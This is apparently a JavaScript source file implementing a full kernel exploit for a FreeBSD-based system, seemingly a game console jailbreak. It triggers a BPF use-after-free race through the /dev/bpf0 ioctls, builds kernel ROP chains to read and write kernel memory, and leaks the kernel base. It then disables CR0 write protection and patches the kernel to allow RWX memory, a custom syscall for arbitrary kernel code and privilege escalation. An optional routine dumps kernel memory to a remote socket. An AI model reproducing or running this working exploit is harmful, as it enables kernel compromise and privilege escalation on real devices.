function kernExploit_bpf_race_old() {
	try {
		//alert("Starting BPF UAF kexploit OLD");
		
		window.nogc = [];
		var scratchbuf = new Uint8Array(0x1000);
		var scratch = p.read8(p.leakval(scratchbuf).add32(window.leakval_slide));

		var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2, 0);
		if (fd < 0)
			throw "kexp failed: no bpf0";

		var bpfinsn = new Uint32Array(0x400);
		var bpfinsnp = p.read8(p.leakval(bpfinsn).add32(window.leakval_slide));
		bpfinsnp.nogc = bpfinsn;
		bpfinsn[0] = p.read4(p.stringify("eth0"));
		bpfinsn[1] = 0;
		p.syscall("sys_ioctl", fd, 0x8020426C, bpfinsnp); // 8020426C = BIOCSETIF - bind eth0
		if (p.syscall("sys_write", fd, scratch, 40).low == (-1 >>> 0)) {
			bpfinsn[0] = p.read4(p.stringify("wlan"));
			bpfinsn[1] = 0x30;
			p.syscall("sys_ioctl", fd, 0x8020426C, bpfinsnp); // 8020426C = BIOCSETIF - bind wlan0
			if (p.syscall("sys_write", fd, scratch, 40).low == (-1 >>> 0))
				throw "couldn't find interface :(";
		}
		
		// BPF helpers
		
		var push_bpf = function(bpfbuf, cmd, k) {
			var i = bpfbuf.i;
			if (!i)
				i = 0;
			bpfbuf[i*2] = cmd;
			bpfbuf[i*2+1] = k;
			bpfbuf.i = i+1;
		}
		
		var bpf_write8imm = function(bpf, offset, imm) {
			if (!(imm instanceof int64))
				imm = new int64(imm, 0);
			push_bpf(bpf, 0, imm.low); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset); // BPF_ST
			push_bpf(bpf, 0, imm.hi); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset+1); // BPF_ST -> RDI: pop rsp
		}
		
		var bpf_copy8 = function(bpf, offset_to, offset_from) {
			push_bpf(bpf, 0x60, offset_from); // BPF_LD|BPF_MEM offset_from
			push_bpf(bpf, 2, offset_to); // BPF_ST offset_to
			push_bpf(bpf, 0x60, offset_from+1); // BPF_LD|BPF_MEM offset_from+1
			push_bpf(bpf, 2, offset_to+1); // BPF_ST offset_to+1
		}
		var bpf_add4 = function(bpf, offset, val) {
			push_bpf(bpf, 0x60, offset); // BPF_LD offset
			push_bpf(bpf, 4, val); // BPF_ALU|BPF_ADD|BPF_K val
			push_bpf(bpf, 2, offset); // BPF_ST offset
		}
		
		// Setup valid program
		var bpf_valid_u32 = new Uint32Array(0x4000);		
		for (var i = 0 ; i < 0x4000;) {
			bpf_valid_u32[i++] = 6; // BPF_RET
			bpf_valid_u32[i++] = 0; // 0
		}
		
		// Setup invalid program
		var bpf_invalid_u32 = new Uint32Array(0x4000);
		for (var i = 0 ; i < 0x4000;) {
			bpf_invalid_u32[i++] = 4; // BPF_ALU|BPF_ADD|BPF_K (used as a NOP)
			bpf_invalid_u32[i++] = 0; // 0
		}
		push_bpf(bpf_invalid_u32, 5, 2); // BPF_JMP 2
		push_bpf(bpf_invalid_u32, 0x12, 0); // invalid BPF opcode
		bpf_invalid_u32.i = 16;
		

		// kROP helpers
		
		var krop_off = 0x1E;
		var reset_krop = function() {
			krop_off = 0x1E;
			bpf_invalid_u32.i = 16;
		}
		var push_krop = function(value) {
			bpf_write8imm(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var push_krop_fromoff = function(value) {
			bpf_copy8(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var finalize_krop = function(retv) {
			if (!retv)
				retv = 5;
			push_bpf(bpf_invalid_u32, 6, retv); // BPF_RET retv
		}
		
		/*
		 fake stack frame
		 */
		reset_krop();
		push_krop(window.gadgets["pop rdi"]);
		push_krop(0); // 8
		push_krop(window.gadgets["pop rdi"]); // 0x10
		push_krop(0); // 0x18
		push_krop(window.gadgets["pop rdi"]); // 0x20
		push_krop(0); // 0x28
		push_krop(window.gadgets["pop rax"]); // 0x30
		push_krop(0); // 0x38
		push_krop(window.gadgets["ret"]); // 0x40
		push_krop(window.gadgets["leave_1"]); // 0x48
		//push_krop(window.gadgets["ep"]); // 0x48
		finalize_krop();

		var bpf_valid = p.read8(p.leakval(bpf_valid_u32).add32(window.leakval_slide));
		var bpf_invalid = p.read8(p.leakval(bpf_invalid_u32).add32(window.leakval_slide));

		var bpf_valid_prog = bpfinsnp.add32(0x40);
		var bpf_invalid_prog = bpfinsnp.add32(0x80);
		
		p.write8(bpf_valid_prog, 64);
		p.write8(bpf_invalid_prog, 64);
		p.write8(bpf_valid_prog.add32(8), bpf_valid);
		p.write8(bpf_invalid_prog.add32(8), bpf_invalid);
		
		p.syscall("sys_write", fd, scratch, 40);
		p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog); // 0x8010427B = BIOCSETWF
		p.syscall("sys_ioctl", fd, 0x8010427B, bpf_invalid_prog); // 0x8010427B = BIOCSETWF
		p.syscall("sys_write", fd, scratch, 40);
		
		// ioctl() with valid BPF program -> will trigger reallocation of BFP code alloc
		window.spawnthread(function(thread2){
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_valid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
		
		// ioctl() with invalid BPF program -> this will be executed when triggering bug
		window.spawnthread(function(thread2){
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_invalid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});

		bpfinsn[0] = 0;

		var kern_write8 = function(addr, val) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(val); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		var kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		};
		
		var readable_kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.readable_read8(bpfinsnp);
		}
		
		var kern_memcpy = function(dst, src, size) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(dst); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(src); // 0x18
			push_krop(window.gadgets["pop rdx"]); // 0x20
			push_krop(size); // 0x28
			push_krop(window.gadgets["memcpy"]); // 0x30
			
			push_krop(window.gadgets["ret"]); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};

		var kern_leak_rip = function() {
			reset_krop();
			bpf_copy8(bpf_invalid_u32, 0, 0x1E);
			push_krop(window.gadgets["pop rdi"]);
			push_krop(bpfinsnp); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop_fromoff(0); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			//push_krop(window.gadgets["infloop"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		}
		
		//alert("mm");
		//alert(kern_leak_rip());
		var kernelBase = kern_leak_rip().sub32(window.kernel_offsets["bpf_slide"]);
		//var kernelBase = new int64(0x82200000, -1);
		/*if (readable_kern_read8(kernelBase) != "7f454c4602010109")
			alert("Not found kernel base! 0x" + kernelBase);
		else
			alert("found");*/
		
		if (getKernelBaseOnly)
			return kernelBase;
		
		var kdump = function(address, size) {
			var s = p.socket();
			alert("After pressing OK, please launch socket listen.");
			p.connectSocket(s, socket_ip_pc, socket_port_send);
			alert("Starting kernel dumping to socket. Accept to continue.");
			var kernelBuf = p.malloc(size);
			kern_memcpy(kernelBuf, address, size);
			p.writeSocket(s, kernelBuf, size);
			p.closeSocket(s);
			alert("Kernel has theoritically been dumped on your target IP.");
		};
		
		if (dump_kernel)
			kdump(kernelBase, 0x69B8000);
			//kdump(kernelBase, 0x19B8000);
		
		var kern_get_cr0 = function() {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"]));
			push_krop(window.gadgets["ret"]); // 8
			push_krop(window.gadgets["pop rdi"]); // 0x10
			push_krop(bpfinsnp); // 0x16
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read4(bpfinsnp);
		};

		var kern_set_cr0_write = function(cr0, addr, val) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(addr); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(val); // 0x38
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		/*
		var kern_jump_cr0 = function(addr, cr0, rdi, rsi) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(rdi); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(rsi); // 0x38
			push_krop(addr); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		*/
		
		alert("Applying kernel patches");
		
		var cr0 = kern_get_cr0();
		cr0 &= ((~(1 << 16)) >>> 0);
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), patch_data_qword);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), kernelBase.add32(src_offset));
		}
		
		// Patch mprotect: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
		
		// Patch sys_mmap: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
		
		// Patch syscall: syscall instruction allowed anywhere
		kpatch(window.kernel_offsets["amd64_syscall_patch_offset"], new int64(window.kernel_patches["amd64_syscall_patch_1"], window.kernel_patches["amd64_syscall_patch_2"]));
		
		
		// Patch sys_dynlib_dlsym: Allow from anywhere
		//kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch_1"], window.kernel_patches["sys_dynlib_dlsym_patch_2"]));
		
		
		// Add custom sys_exec() call to execute arbitrary code as kernel
		kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
		kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
		kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
		
		// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
		kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
	
		return kernelBase;
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}